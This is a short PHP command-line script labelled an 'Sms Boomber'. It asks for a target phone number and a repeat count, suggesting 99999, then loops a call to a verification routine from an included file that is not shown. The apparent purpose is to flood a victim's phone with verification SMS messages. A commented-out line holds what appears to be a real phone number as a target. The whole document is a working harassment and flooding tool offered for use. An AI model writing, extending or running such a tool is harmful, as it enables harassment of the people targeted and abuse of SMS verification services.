<?php
include 'func.php';

/*
   
    by Rahim
*/

$init = new Bom();

//Eksekusi Sms Boomber
echo "Nomor? (contoh : 628xxxx)\nInput : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "Jumlah? (contoh : 99999)\nInput : ";
$b = trim(fgets(STDIN));
//$init->no = "08561635203"; //Nomer Hp tujuan Pakai tanpa awalan 62 / 0. contoh 81xxxxxxx
$loop = "$b"; //Jumlah eksekusi
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}
